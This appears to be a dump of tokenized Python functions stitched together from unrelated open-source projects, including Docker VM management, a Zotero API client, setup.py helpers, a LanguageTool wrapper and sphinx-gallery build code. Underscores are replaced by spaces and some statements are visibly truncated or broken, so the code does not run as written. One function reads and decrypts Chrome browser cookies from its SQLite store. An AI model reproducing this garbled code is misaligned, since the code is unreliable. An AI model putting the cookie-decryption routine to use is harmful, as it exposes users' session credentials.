def remove exited dusty containers ( ) : client = get docker client ( ) exited containers = get exited dusty containers ( ) removed containers = [ ] for container in exited containers : log to client ( "Removing container {}" . format ( container [ 'Names' ] [ 0 ] ) ) try : client . remove container ( container [ 'Id' ] , v = True ) removed containers . append ( container ) except Exception as e : log to client ( e . message or str ( e ) ) return removed containers
def remove images ( ) : client = get docker client ( ) removed = remove dangling images ( ) dusty images = get dusty images ( ) all images = client . images ( all = True ) for image in all images : if set ( image [ 'Repo Tags' ] ) . intersection ( dusty images ) : try : client . remove image ( image [ 'Id' ] ) except Exception as e : logging . info ( "Couldn't remove image {}" . format ( image [ 'Repo Tags' ] ) ) else : log to client ( "Removed Image {}" . format ( image [ 'Repo Tags' ] ) ) removed . append ( image ) return removed
def case insensitive rename ( src , dst ) : temp dir = tempfile . mkdtemp ( ) shutil . rmtree ( temp dir ) shutil . move ( src , temp dir ) shutil . move ( temp dir , dst )
def composed app dict ( app name , assembled specs , port specs ) : logging . info ( "Compose Compiler: Compiling dict for app {}" . format ( app name ) ) app spec = assembled specs [ 'apps' ] [ app name ] compose dict = app spec [ "compose" ] apply env overrides ( env overrides for app or service ( app name ) , compose dict ) if 'image' in app spec and 'build' in app spec : raise Runtime Error ( "image and build are both specified in the spec for {}" . format ( app name ) ) elif 'image' in app spec : logging . info compose dict [ 'image' ] = app spec [ 'image' ] elif 'build' in app spec : compose dict [ 'build' ] = get build path ( app spec ) else : raise Runtime Error ( "Neither image nor build was specified in the spec for {}" . format ( app name ) ) compose dict [ 'entrypoint' ] = [ ] compose dict [ 'command' ] = compile docker command ( app spec ) compose dict [ 'container name' ] = "dusty {} 1" . format ( app name ) logging . info ( "Compose Compiler: compiled command {}" . format ( compose dict [ 'command' ] ) ) compose dict [ 'links' ] = links for app ( app spec , assembled specs ) logging . info ( "Compose Compiler: links {}" . format ( compose dict [ 'links' ] ) ) compose dict [ 'volumes' ] = compose dict [ 'volumes' ] + get compose volumes ( app name , assembled specs ) logging . info ( "Compose Compiler: volumes {}" . format ( compose dict [ 'volumes' ] ) ) port list = get ports list ( app name , port specs ) if port list : compose dict [ 'ports' ] = port list logging . info ( "Compose Compiler: ports {}" . format ( port list ) ) compose dict [ 'user' ] = 'root' return compose dict
def get ports list ( app name , port specs ) : if app name not in port specs [ 'docker compose' ] : return [ ] return [ "{}:{}" . format ( port spec [ 'mapped host port' ] , port spec [ 'in container port' ] ) for port spec in port specs [ 'docker compose' ] [ app name ] ]
def expand libs in apps ( specs ) : for app name , app spec in specs [ 'apps' ] . iteritems ( ) : if 'depends' in app spec and 'libs' in app spec [ 'depends' ] : app spec [ 'depends' ] [ 'libs' ] = get dependent ( 'libs' , app name , specs , 'apps' )
def expand libs in libs ( specs ) : for lib name , lib spec in specs [ 'libs' ] . iteritems ( ) : if 'depends' in lib spec and 'libs' in lib spec [ 'depends' ] : lib spec [ 'depends' ] [ 'libs' ] = get dependent ( 'libs' , lib name , specs , 'libs' )
def get referenced libs ( specs ) : active libs = set ( ) for app spec in specs [ 'apps' ] . values ( ) : for lib in app spec [ 'depends' ] [ 'libs' ] : active libs . add ( lib ) return active libs
def nginx location spec ( port spec , bridge ip ) : location string spec = "\t \t location / { \n" for location setting in [ 'proxy http version 1.1;' , 'proxy set header Upgrade $http upgrade;' , 'proxy set header Connection "upgrade";' , 'proxy set header X-Forwarded-For $proxy add x forwarded for;' , 'proxy set header Host $http host;' , nginx proxy string ( port spec , bridge ip ) ] : location string spec += "\t \t \t {} \n" . format ( location setting ) location string spec += "\t \t } \n" return location string spec
def nginx http spec ( port spec , bridge ip ) : server string spec = "\t server {\n" server string spec += "\t \t {}\n" . format ( nginx max file size string ( ) ) server string spec += "\t \t {}\n" . format ( nginx listen string ( port spec ) ) server string spec += "\t \t {}\n" . format ( nginx server name string ( port spec ) ) server string spec += nginx location spec ( port spec , bridge ip ) server string spec += custom 502 page ( ) server string spec += "\t }\n" return server string spec
def nginx stream spec ( port spec , bridge ip ) : server string spec = "\t server {\n" server string spec += "\t \t {}\n" . format ( nginx listen string ( port spec ) ) server string spec += "\t \t {}\n" . format ( nginx proxy string ( port spec , bridge ip ) ) server string spec += "\t }\n" return server string spec
def get lib volume mounts ( base lib name , assembled specs ) : volumes = [ get lib repo volume mount ( assembled specs [ 'libs' ] [ base lib name ] ) ] volumes . append ( get command files volume mount ( base lib name , test = True ) ) for lib name in assembled specs [ 'libs' ] [ base lib name ] [ 'depends' ] [ 'libs' ] : lib spec = assembled specs [ 'libs' ] [ lib name ] volumes . append ( get lib repo volume mount ( lib spec ) ) return volumes
def get app libs volume mounts ( app name , assembled specs ) : volumes = [ ] for lib name in assembled specs [ 'apps' ] [ app name ] [ 'depends' ] [ 'libs' ] : lib spec = assembled specs [ 'libs' ] [ lib name ] volumes . append ( "{}:{}" . format ( Repo ( lib spec [ 'repo' ] ) . vm path , container code path ( lib spec ) ) ) return volumes
def init docker vm ( ) : if not dusty vm exists ( ) : log to client ( 'Initializing new Dusty VM with Docker Machine' ) machine options = [ '--driver' , 'virtualbox' , '--virtualbox-cpu-count' , '-1' , '--virtualbox-boot2docker-url' , constants . CONFIG BOOT2DOCKER URL , '--virtualbox-memory' , str ( get config value ( constants . CONFIG VM MEM SIZE ) ) , '--virtualbox-hostonly-nictype' , constants . VM NIC TYPE ] check call demoted ( [ 'docker-machine' , 'create' ] + machine options + [ constants . VM MACHINE NAME ] , redirect stderr = True )
def start docker vm ( ) : is running = docker vm is running ( ) if not is running : log to client ( 'Starting docker-machine VM {}' . format ( constants . VM MACHINE NAME ) ) apply nat dns host resolver ( ) apply nat net less greedy subnet ( ) check and log output and error demoted ( [ 'docker-machine' , 'start' , constants . VM MACHINE NAME ] , quiet on success = True ) return is running
def docker vm is running ( ) : running vms = check output demoted ( [ 'V Box Manage' , 'list' , 'runningvms' ] ) for line in running vms . splitlines ( ) : if '"{}"' . format ( constants . VM MACHINE NAME ) in line : return True return False
def create cookie ( host , path , secure , expires , name , value ) : return http . cookiejar . Cookie ( 0 , name , value , None , False , host , host . startswith ( '.' ) , host . startswith ( '.' ) , path , True , secure , expires , False , None , None , { } )
def load ( self ) : con = sqlite3 . connect ( self . tmp cookie file ) cur = con . cursor ( ) try : # chrome <=55 cur . execute ( 'SELECT host key, path, secure, expires utc, name, value, encrypted value ' 'FROM cookies WHERE host key like "%{}%";' . format ( self . domain name ) ) except sqlite3 . Operational Error : # chrome >=56 cur . execute ( 'SELECT host key, path, is secure, expires utc, name, value, encrypted value ' 'FROM cookies WHERE host key like "%{}%";' . format ( self . domain name ) ) cj = http . cookiejar . Cookie Jar ( ) for item in cur . fetchall ( ) : host , path , secure , expires , name = item [ : 5 ] value = self . decrypt ( item [ 5 ] , item [ 6 ] ) c = create cookie ( host , path , secure , expires , name , value ) cj . set cookie ( c ) con . close ( ) return cj
def ib64 patched ( self , attrs D , contentparams ) : if attrs D . get ( "mode" , "" ) == "base64" : return 0 if self . contentparams [ "type" ] . startswith ( "text/" ) : return 0 if self . contentparams [ "type" ] . endswith ( "+xml" ) : return 0 if self . contentparams [ "type" ] . endswith ( "/xml" ) : return 0 if self . contentparams [ "type" ] . endswith ( "/json" ) : return 0 return 0
def cleanwrap ( func ) : def enc ( self , * args , * * kwargs ) : """ Send each item to  cleanup() """ return ( func ( self , item , * * kwargs ) for item in args ) return enc
def ss wrap ( func ) : def wrapper ( self , * args , * * kwargs ) : if not self . savedsearch : self . savedsearch = Saved Search ( self ) return func ( self , * args , * * kwargs ) return wrapper
def error handler ( req ) : error codes = { 400 : ze . Unsupported Params , 401 : ze . User Not Authorised , 403 : ze . User Not Authorised , 404 : ze . Resource Not Found , 409 : ze . Conflict , 412 : ze . Pre Condition Failed , 413 : ze . Request Entity Too Large , 428 : ze . Pre Condition Required , 429 : ze . Too Many Requests , } def err msg ( req ) : return "\n Code: %s\n URL: %s\n Method: %s\n Response: %s" % ( req . status code , # error.msg, req . url , req . request . method , req . text , ) if error codes . get ( req . status code ) : # check to see whether its 429 if req . status code == 429 : # call our back-off function delay = backoff . delay if delay > 32 : # we've waited a total of 62 seconds (2 + 4  + 32), so give up backoff . reset ( ) raise ze . Too Many Retries ( ) time . sleep ( delay ) sess = requests . Session ( ) new req = sess . send ( req . request ) try : new req . raise for status ( ) except requests . exceptions . HTTP Error : error handler ( new req ) else : raise error codes . get ( req . status code ) ( err msg ( req ) ) else : raise ze . HTTP Error ( err msg ( req ) )
def default headers ( self ) : headers = { "User-Agent" : "Pyzotero/%s" % version , "Zotero-API-Version" : "%s" % api version , } if self . api key : headers [ "Authorization" ] = "Bearer %s" % self . api key return headers
def cleanup ( self , to clean , allow = ( ) ) : # this item's been retrieved from the API, we only need the 'data' # entry if to clean . keys ( ) == [ "links" , "library" , "version" , "meta" , "key" , "data" ] : to clean = to clean [ "data" ] return dict ( [ [ k , v ] for k , v in list ( to clean . items ( ) ) if ( k in allow or k not in self . temp keys ) ] )
def extract links ( self ) : extracted = dict ( ) try : for key , value in self . request . links . items ( ) : parsed = urlparse ( value [ "url" ] ) fragment = "{path}?{query}" . format ( path = parsed [ 2 ] , query = parsed [ 4 ] ) extracted [ key ] = fragment # add a 'self' link parsed = list ( urlparse ( self . self link ) ) # strip 'format' query parameter stripped = "&" . join ( [ "%s=%s" % ( p [ 0 ] , p [ 1 ] ) for p in parse qsl ( parsed [ 4 ] ) if p [ 0 ] != "format" ] ) # rebuild url fragment # this is a death march extracted [ "self" ] = urlunparse ( [ parsed [ 0 ] , parsed [ 1 ] , parsed [ 2 ] , parsed [ 3 ] , stripped , parsed [ 5 ] ] ) return extracted except Key Error : # No links present, because it's a single item return None
def publications ( self ) : if self . library type != "users" : raise ze . Call Does Not Exist ( "This API call does not exist for group libraries" ) query string = "/{t}/{u}/publications/items" return self . build query ( query string )
def num collectionitems ( self , collection ) : query = "/{t}/{u}/collections/{c}/items" . format ( u = self . library id , t = self . library type , c = collection . upper ( ) ) return self . totals ( query )
def num tagitems ( self , tag ) : query = "/{t}/{u}/tags/{ta}/items" . format ( u = self . library id , t = self . library type , ta = tag ) return self . totals ( query )
def totals ( self , query ) : self . add parameters ( limit = 1 ) query = self . build query ( query ) self . retrieve data ( query ) self . url params = None # extract the 'total items' figure return int ( self . request . headers [ "Total-Results" ] )
def fulltext item ( self , itemkey , * * kwargs ) : query string = "/{t}/{u}/items/{itemkey}/fulltext" . format ( t = self . library type , u = self . library id , itemkey = itemkey ) return self . build query ( query string )
def last modified version ( self , * * kwargs ) : self . items ( * * kwargs ) return int ( self . request . headers . get ( "last-modified-version" , 0 ) )
def file ( self , item , * * kwargs ) : query string = "/{t}/{u}/items/{i}/file" . format ( u = self . library id , t = self . library type , i = item . upper ( ) ) return self . build query ( query string , no params = True )
def dump ( self , itemkey , filename = None , path = None ) : if not filename : filename = self . item ( itemkey ) [ "data" ] [ "filename" ] if path : pth = os . path . join ( path , filename ) else : pth = filename file = self . file ( itemkey ) if self . snapshot : self . snapshot = False pth = pth + ".zip" with open ( pth , "wb" ) as f : f . write ( file )
def collections sub ( self , collection , * * kwargs ) : query string = "/{t}/{u}/collections/{c}/collections" . format ( u = self . library id , t = self . library type , c = collection . upper ( ) ) return self . build query ( query string )
def json processor ( self , retrieved ) : json kwargs = { } if self . preserve json order : json kwargs [ "object pairs hook" ] = Ordered Dict # send entries to  tags data if there's no JSON try : items = [ json . loads ( e [ "content" ] [ 0 ] [ "value" ] , * * json kwargs ) for e in retrieved . entries ] except Key Error : return self . tags data ( retrieved ) return items
def csljson processor ( self , retrieved ) : items = [ ] json kwargs = { } if self . preserve json order : json kwargs [ "object pairs hook" ] = Ordered Dict for csl in retrieved . entries : items . append ( json . loads ( csl [ "content" ] [ 0 ] [ "value" ] , * * json kwargs ) ) self . url params = None return items
def bib processor ( self , retrieved ) : items = [ ] for bib in retrieved . entries : items . append ( bib [ "content" ] [ 0 ] [ "value" ] ) self . url params = None return items
def citation processor ( self , retrieved ) : items = [ ] for cit in retrieved . entries : items . append ( cit [ "content" ] [ 0 ] [ "value" ] ) self . url params = None return items
def item template ( self , itemtype ) : # if we have a template and it hasn't been updated since we stored it template name = "item template " + itemtype query string = "/items/new?item Type={i}" . format ( i = itemtype ) if self . templates . get ( template name ) and not self . updated ( query string , self . templates [ template name ] , template name ) : return copy . deepcopy ( self . templates [ template name ] [ "tmplt" ] ) # otherwise perform a normal request and cache the response retrieved = self . retrieve data ( query string ) return self . cache ( retrieved , template name )
def show condition operators ( self , condition ) : # dict keys of allowed operators for the current condition permitted operators = self . savedsearch . conditions operators . get ( condition ) # transform these into values permitted operators list = set ( [ self . savedsearch . operators . get ( op ) for op in permitted operators ] ) return permitted operators list
def fields types ( self , tname , qstring , itemtype ) : # check for a valid cached version template name = tname + itemtype query string = qstring . format ( i = itemtype ) if self . templates . get ( template name ) and not self . updated ( query string , self . templates [ template name ] , template name ) : return self . templates [ template name ] [ "tmplt" ] # otherwise perform a normal request and cache the response retrieved = self . retrieve data ( query string ) return self . cache ( retrieved , template name )
def item fields ( self ) : # Check for a valid cached version if self . templates . get ( "item fields" ) and not self . updated ( "/item Fields" , self . templates [ "item fields" ] , "item fields" ) : return self . templates [ "item fields" ] [ "tmplt" ] query string = "/item Fields" # otherwise perform a normal request and cache the response retrieved = self . retrieve data ( query string ) return self . cache ( retrieved , "item fields" )
def validate ( self , conditions ) : allowed keys = set ( self . searchkeys ) operators set = set ( self . operators . keys ( ) ) for condition in conditions : if set ( condition . keys ( ) ) != allowed keys : raise ze . Param Not Passed ( "Keys must be all of: %s" % ", " . join ( self . searchkeys ) ) if condition . get ( "operator" ) not in operators set : raise ze . Param Not Passed ( "You have specified an unknown operator: %s" % condition . get ( "operator" ) ) # dict keys of allowed operators for the current condition permitted operators = self . conditions operators . get ( condition . get ( "condition" ) ) # transform these into values permitted operators list = set ( [ self . operators . get ( op ) for op in permitted operators ] ) if condition . get ( "operator" ) not in permitted operators list : raise ze . Param Not Passed ( "You may not use the '%s' operator when selecting the '%s' condition. \n Allowed operators: %s" % ( condition . get ( "operator" ) , condition . get ( "condition" ) , ", " . join ( list ( permitted operators list ) ) , ) )
def which ( program , win allow cross arch = True ) : def is exe ( path ) : return os . path . isfile ( path ) and os . access ( path , os . X OK ) def get path list ( ) : return os . environ [ 'PATH' ] . split ( os . pathsep ) if os . name == 'nt' : def find exe ( program ) : root , ext = os . path . splitext ( program ) if ext : if is exe ( program ) : return program else : for ext in os . environ [ 'PATHEXT' ] . split ( os . pathsep ) : program path = root + ext . lower ( ) if is exe ( program path ) : return program path return None def get path list ( ) : paths = get path list ( ) if win allow cross arch : alt sys path = os . path . expandvars ( r"$WINDIR\Sysnative" ) if os . path . isdir ( alt sys path ) : paths . insert ( 0 , alt sys path ) else : alt sys path = os . path . expandvars ( r"$WINDIR\Sys WOW64" ) if os . path . isdir ( alt sys path ) : paths . append ( alt sys path ) return paths else : def find exe ( program ) : return program if is exe ( program ) else None get path list = get path list if os . path . split ( program ) [ 0 ] : program path = find exe ( program ) if program path : return program path else : for path in get path list ( ) : program path = find exe ( os . path . join ( path , program ) ) if program path : return program path return None
def split multiline ( value ) : return [ element for element in ( line . strip ( ) for line in value . split ( '\n' ) ) if element ]
def split elements ( value ) : items = [ v . strip ( ) for v in value . split ( ',' ) ] if len ( items ) == 1 : items = value . split ( ) return items
def eval environ ( value ) : def eval environ str ( value ) : parts = value . split ( ';' ) if len ( parts ) < 2 : return value expr = parts [ 1 ] . lstrip ( ) if not re . match ( "^((\\w+(\\.\\w+)?|'.*?'|\".*?\")\\s+" '(in|==|!=|not in)\\s+' "(\\w+(\\.\\w+)?|'.*?'|\".*?\")" '(\\s+(or|and)\\s+)?)+$' , expr ) : raise Value Error ( 'bad environment marker: %r' % expr ) expr = re . sub ( r"(platform\.\w+)" , r"\1()" , expr ) return parts [ 0 ] if eval ( expr ) else '' if isinstance ( value , list ) : new value = [ ] for element in value : element = eval environ str ( element ) if element : new value . append ( element ) elif isinstance ( value , str ) : new value = eval environ str ( value ) else : new value = value return new value
def get cfg value ( config , section , option ) : try : value = config [ section ] [ option ] except Key Error : if ( section , option ) in MULTI OPTIONS : return [ ] else : return '' if ( section , option ) in MULTI OPTIONS : value = split multiline ( value ) if ( section , option ) in ENVIRON OPTIONS : value = eval environ ( value ) return value
def set cfg value ( config , section , option , value ) : if isinstance ( value , list ) : value = '\n' . join ( value ) config [ section ] [ option ] = value
def cfg to args ( config ) : kwargs = { } opts to args = { 'metadata' : [ ( 'name' , 'name' ) , ( 'author' , 'author' ) , ( 'author-email' , 'author email' ) , ( 'maintainer' , 'maintainer' ) , ( 'maintainer-email' , 'maintainer email' ) , ( 'home-page' , 'url' ) , ( 'summary' , 'description' ) , ( 'description' , 'long description' ) , ( 'download-url' , 'download url' ) , ( 'classifier' , 'classifiers' ) , ( 'platform' , 'platforms' ) , ( 'license' , 'license' ) , ( 'keywords' , 'keywords' ) , ] , 'files' : [ ( 'packages root' , 'package dir' ) , ( 'packages' , 'packages' ) , ( 'modules' , 'py modules' ) , ( 'scripts' , 'scripts' ) , ( 'package data' , 'package data' ) , ( 'data files' , 'data files' ) , ] , } opts to args [ 'metadata' ] . append ( ( 'requires-dist' , 'install requires' ) ) if IS PY2K and not which ( '3to2' ) : kwargs [ 'setup requires' ] = [ '3to2' ] kwargs [ 'zip safe' ] = False for section in opts to args : for option , argname in opts to args [ section ] : value = get cfg value ( config , section , option ) if value : kwargs [ argname ] = value if 'long description' not in kwargs : kwargs [ 'long description' ] = read description file ( config ) if 'package dir' in kwargs : kwargs [ 'package dir' ] = { '' : kwargs [ 'package dir' ] } if 'keywords' in kwargs : kwargs [ 'keywords' ] = split elements ( kwargs [ 'keywords' ] ) if 'package data' in kwargs : kwargs [ 'package data' ] = get package data ( kwargs [ 'package data' ] ) if 'data files' in kwargs : kwargs [ 'data files' ] = get data files ( kwargs [ 'data files' ] ) kwargs [ 'version' ] = get version ( ) if not IS PY2K : kwargs [ 'test suite' ] = 'test' return kwargs
def run 3to2 ( args = None ) : args = BASE ARGS 3TO2 if args is None else BASE ARGS 3TO2 + args try : proc = subprocess . Popen ( [ '3to2' ] + args , stderr = subprocess . PIPE ) except OS Error : for path in glob . glob ( '*.egg' ) : if os . path . isdir ( path ) and path not in sys . path : sys . path . append ( path ) try : from lib3to2 . main import main as lib3to2 main except Import Error : raise OS Error ( '3to2 script is unavailable.' ) else : if lib3to2 main ( 'lib3to2.fixes' , args ) : raise Exception ( 'lib3to2 parsing error' ) else : # HACK: workaround for 3to2 never returning non-zero # when using the -j option. num errors = 0 while proc . poll ( ) is None : line = proc . stderr . readline ( ) sys . stderr . write ( line ) num errors += line . count ( ': Parse Error: ' ) if proc . returncode or num errors : raise Exception ( 'lib3to2 parsing error' )
def write py2k header ( file list ) : if not isinstance ( file list , list ) : file list = [ file list ] python re = re . compile ( br"^(#!.*\bpython)(.*)([\r\n]+)$" ) coding re = re . compile ( br"coding[:=]\s*([-\w.]+)" ) new line re = re . compile ( br"([\r\n]+)$" ) version 3 = Loose Version ( '3' ) for file in file list : if not os . path . getsize ( file ) : continue rewrite needed = False python found = False coding found = False lines = [ ] f = open ( file , 'rb' ) try : while len ( lines ) < 2 : line = f . readline ( ) match = python re . match ( line ) if match : python found = True version = Loose Version ( match . group ( 2 ) . decode ( ) or '2' ) try : version test = version >= version 3 except Type Error : version test = True if version test : line = python re . sub ( br"\g<1>2\g<3>" , line ) rewrite needed = True elif coding re . search ( line ) : coding found = True lines . append ( line ) if not coding found : match = new line re . search ( lines [ 0 ] ) newline = match . group ( 1 ) if match else b"\n" line = b"# -*- coding: utf-8 -*-" + newline lines . insert ( 1 if python found else 0 , line ) rewrite needed = True if rewrite needed : lines += f . readlines ( ) finally : f . close ( ) if rewrite needed : f = open ( file , 'wb' ) try : f . writelines ( lines ) finally : f . close ( )
def which ( program ) : if os . path . split ( program ) [ 0 ] : program path = find exe ( program ) if program path : return program path else : for path in get path list ( ) : program path = find exe ( os . path . join ( path , program ) ) if program path : return program path return None
def correct ( text : str , matches : [ Match ] ) -> str : ltext = list ( text ) matches = [ match for match in matches if match . replacements ] errors = [ ltext [ match . offset : match . offset + match . errorlength ] for match in matches ] correct offset = 0 for n , match in enumerate ( matches ) : frompos , topos = ( correct offset + match . offset , correct offset + match . offset + match . errorlength ) if ltext [ frompos : topos ] != errors [ n ] : continue repl = match . replacements [ 0 ] ltext [ frompos : topos ] = list ( repl ) correct offset += len ( repl ) - len ( errors [ n ] ) return '' . join ( ltext )
def get version ( ) : version = get attrib ( ) . get ( 'version' ) if not version : match = re . search ( r"Language Tool-?.*?(\S+)$" , get directory ( ) ) if match : version = match . group ( 1 ) return version
def get languages ( ) -> set : try : languages = cache [ 'languages' ] except Key Error : languages = Language Tool . get languages ( ) cache [ 'languages' ] = languages return languages
def get directory ( ) : try : language check dir = cache [ 'language check dir' ] except Key Error : def version key ( string ) : return [ int ( e ) if e . isdigit ( ) else e for e in re . split ( r"(\d+)" , string ) ] def get lt dir ( base dir ) : paths = [ path for path in glob . glob ( os . path . join ( base dir , 'Language Tool*' ) ) if os . path . isdir ( path ) ] return max ( paths , key = version key ) if paths else None base dir = os . path . dirname ( sys . argv [ 0 ] ) language check dir = get lt dir ( base dir ) if not language check dir : try : base dir = os . path . dirname ( os . path . abspath ( file ) ) except Name Error : pass else : language check dir = get lt dir ( base dir ) if not language check dir : raise Path Error ( "can't find Language Tool directory in {!r}" . format ( base dir ) ) cache [ 'language check dir' ] = language check dir return language check dir
def set directory ( path = None ) : old path = get directory ( ) terminate server ( ) cache . clear ( ) if path : cache [ 'language check dir' ] = path try : get jar info ( ) except Error : cache [ 'language check dir' ] = old path raise
def check ( self , text : str , srctext = None ) -> [ Match ] : root = self . get root ( self . url , self . encode ( text , srctext ) ) return [ Match ( e . attrib ) for e in root if e . tag == 'error' ]
def correct ( self , text : str , srctext = None ) -> str : return correct ( text , self . check ( text , srctext ) )
def get common prefix ( z ) : name list = z . namelist ( ) if name list and all ( n . startswith ( name list [ 0 ] ) for n in name list [ 1 : ] ) : return name list [ 0 ] return None
def process events ( self , events ) : for f , callback , transferred , key , ov in events : try : self . logger . debug ( 'Invoking event callback {}' . format ( callback ) ) value = callback ( transferred , key , ov ) except OS Error : self . logger . warning ( 'Event callback failed' , exc info = sys . exc info ( ) ) else : f . set result ( value )
def async Close ( fn ) : @ functools . wraps ( fn ) def wrapper ( * args , * * kwargs ) : f = asyncio . ensure future ( fn ( * args , * * kwargs ) ) while not f . done ( ) : Q Application . instance ( ) . process Events ( ) return wrapper
def async Slot ( * args ) : def outer decorator ( fn ) : @ Slot ( * args ) @ functools . wraps ( fn ) def wrapper ( * args , * * kwargs ) : asyncio . ensure future ( fn ( * args , * * kwargs ) ) return wrapper return outer decorator
def with logger ( cls ) : attr name = ' logger' cls name = cls . qualname module = cls . module if module is not None : cls name = module + '.' + cls name else : raise Assertion Error setattr ( cls , attr name , logging . get Logger ( cls name ) ) return cls
def process event ( self , key , mask ) : self . logger . debug ( 'Processing event with key {} and mask {}' . format ( key , mask ) ) fileobj , ( reader , writer ) = key . fileobj , key . data if mask & selectors . EVENT READ and reader is not None : if reader . cancelled : self . remove reader ( fileobj ) else : self . logger . debug ( 'Invoking reader callback: {}' . format ( reader ) ) reader . run ( ) if mask & selectors . EVENT WRITE and writer is not None : if writer . cancelled : self . remove writer ( fileobj ) else : self . logger . debug ( 'Invoking writer callback: {}' . format ( writer ) ) writer . run ( )
def setup ( app ) : app . add config value ( 'plot gallery' , True , 'html' ) app . add config value ( 'abort on example error' , False , 'html' ) app . add config value ( 'sphinx gallery conf' , gallery conf , 'html' ) app . add stylesheet ( 'gallery.css' ) app . connect ( 'builder-inited' , generate gallery rst ) app . connect ( 'build-finished' , embed code links )
def twosided 2 centerdc ( data ) : N = len ( data ) # could us int() or // in python 3 newpsd = np . concatenate ( ( cshift ( data [ N // 2 : ] , 1 ) , data [ 0 : N // 2 ] ) ) newpsd [ 0 ] = data [ - 1 ] return newpsd
def centerdc 2 twosided ( data ) : N = len ( data ) newpsd = np . concatenate ( ( data [ N // 2 : ] , ( cshift ( data [ 0 : N // 2 ] , - 1 ) ) ) ) return newpsd
def data two freqs ( N = 200 ) : nn = arange ( N ) xx = cos ( 0.257 * pi * nn ) + sin ( 0.2 * pi * nn ) + 0.01 * randn ( nn . size ) return xx
def spectrum data ( filename ) : import os import pkg resources info = pkg resources . get distribution ( 'spectrum' ) location = info . location # first try develop mode share = os . sep . join ( [ location , "spectrum" , 'data' ] ) filename2 = os . sep . join ( [ share , filename ] ) if os . path . exists ( filename2 ) : return filename2 else : raise Exception ( 'unknown file %s' % filename2 )
def remove bias ( x , axis ) : padded slice = [ slice ( d ) for d in x . shape ] padded slice [ axis ] = np . newaxis mn = np . mean ( x , axis = axis ) return x - mn [ tuple ( padded slice ) ]
def codestr2rst ( codestr , lang = 'python' ) : code directive = "\n.. code-block:: {0}\n\n" . format ( lang ) indented block = indent ( codestr , ' ' * 4 ) return code directive + indented block
def get md5sum ( src file ) : with open ( src file , 'r' ) as src data : src content = src data . read ( ) # data needs to be encoded in python3 before hashing if sys . version info [ 0 ] == 3 : src content = src content . encode ( 'utf-8' ) src md5 = hashlib . md5 ( src content ) . hexdigest ( ) return src md5
def check md5sum change ( src file ) : src md5 = get md5sum ( src file ) src md5 file = src file + '.md5' src file changed = True if os . path . exists ( src md5 file ) : with open ( src md5 file , 'r' ) as file checksum : ref md5 = file checksum . read ( ) if src md5 == ref md5 : src file changed = False if src file changed : with open ( src md5 file , 'w' ) as file checksum : file checksum . write ( src md5 ) return src file changed
def save thumbnail ( image path , base image name , gallery conf ) : first image file = image path . format ( 1 ) thumb dir = os . path . join ( os . path . dirname ( first image file ) , 'thumb' ) if not os . path . exists ( thumb dir ) : os . makedirs ( thumb dir ) thumb file = os . path . join ( thumb dir , 'sphx glr %s thumb.png' % base image name ) if os . path . exists ( first image file ) : scale image ( first image file , thumb file , 400 , 280 ) elif not os . path . exists ( thumb file ) : # create something to replace the thumbnail default thumb file = os . path . join ( glr path static ( ) , 'no image.png' ) default thumb file = gallery conf . get ( "default thumb file" , default thumb file ) scale image ( default thumb file , thumb file , 200 , 140 )
def generate dir rst ( src dir , target dir , gallery conf , seen backrefs ) : if not os . path . exists ( os . path . join ( src dir , 'README.txt' ) ) : print ( 80 * ' ' ) print ( 'Example directory %s does not have a README.txt file' % src dir ) print ( 'Skipping this directory' ) print ( 80 * ' ' ) return "" # because string is an expected return type fhindex = open ( os . path . join ( src dir , 'README.txt' ) ) . read ( ) if not os . path . exists ( target dir ) : os . makedirs ( target dir ) sorted listdir = [ fname for fname in sorted ( os . listdir ( src dir ) ) if fname . endswith ( '.py' ) ] entries text = [ ] for fname in sorted listdir : amount of code = generate file rst ( fname , target dir , src dir , gallery conf ) new fname = os . path . join ( src dir , fname ) intro = extract intro ( new fname ) write backreferences ( seen backrefs , gallery conf , target dir , fname , intro ) this entry = thumbnail div ( target dir , fname , intro ) + % ( target dir , fname [ : - 3 ] ) entries text . append ( ( amount of code , this entry ) ) # sort to have the smallest entries in the beginning entries text . sort ( ) for , entry text in entries text : fhindex += entry text # clear at the end of the section fhindex += return fhindex
def execute script ( code block , example globals , image path , fig count , src file , gallery conf ) : time elapsed = 0 stdout = '' # We need to execute the code print ( 'plotting code blocks in %s' % src file ) plt . close ( 'all' ) cwd = os . getcwd ( ) # Redirect output to stdout and orig stdout = sys . stdout try : # First cd in the original example dir, so that any file # created by the example get created in this directory os . chdir ( os . path . dirname ( src file ) ) my buffer = String IO ( ) my stdout = Tee ( sys . stdout , my buffer ) sys . stdout = my stdout t start = time ( ) exec ( code block , example globals ) time elapsed = time ( ) - t start sys . stdout = orig stdout my stdout = my buffer . getvalue ( ) . strip ( ) . expandtabs ( ) if my stdout : stdout = CODE OUTPUT . format ( indent ( my stdout , ' ' * 4 ) ) os . chdir ( cwd ) figure list = save figures ( image path , fig count , gallery conf ) # Depending on whether we have one or more figures, we're using a # horizontal list or a single rst call to 'image'. image list = "" if len ( figure list ) == 1 : figure name = figure list [ 0 ] image list = SINGLE IMAGE % figure name . lstrip ( '/' ) elif len ( figure list ) > 1 : image list = HLIST HEADER for figure name in figure list : image list += HLIST IMAGE TEMPLATE % figure name . lstrip ( '/' ) except Exception : formatted exception = traceback . format exc ( ) print ( 80 * ' ' ) print ( '%s is not compiling:' % src file ) print ( formatted exception ) print ( 80 * ' ' ) figure list = [ ] image list = codestr2rst ( formatted exception , lang = 'pytb' ) # Overrides the output thumbnail in the gallery for easy identification broken img = os . path . join ( glr path static ( ) , 'broken example.png' ) shutil . copyfile ( broken img , os . path . join ( cwd , image path . format ( 1 ) ) ) fig count += 1 # raise count to avoid overwriting image # Breaks build on first example error if gallery conf [ 'abort on example error' ] : raise finally : os . chdir ( cwd ) sys . stdout = orig stdout print ( " - time elapsed : %.2g sec" % time elapsed ) code output = "\n{0}\n\n{1}\n\n" . format ( image list , stdout ) return code output , time elapsed , fig count + len ( figure list )
def ipy notebook skeleton ( ) : py version = sys . version info notebook skeleton = { "cells" : [ ] , "metadata" : { "kernelspec" : { "display name" : "Python " + str ( py version [ 0 ] ) , "language" : "python" , "name" : "python" + str ( py version [ 0 ] ) } , "language info" : { "codemirror mode" : { "name" : "ipython" , "version" : py version [ 0 ] } , "file extension" : ".py" , "mimetype" : "text/x-python" , "name" : "python" , "nbconvert exporter" : "python" , "pygments lexer" : "ipython" + str ( py version [ 0 ] ) , "version" : '{0}.{1}.{2}' . format ( * sys . version info [ : 3 ] ) } } , "nbformat" : 4 , "nbformat minor" : 0 } return notebook skeleton
def save file ( self ) : with open ( self . write file , 'w' ) as out nb : json . dump ( self . work notebook , out nb , indent = 2 )
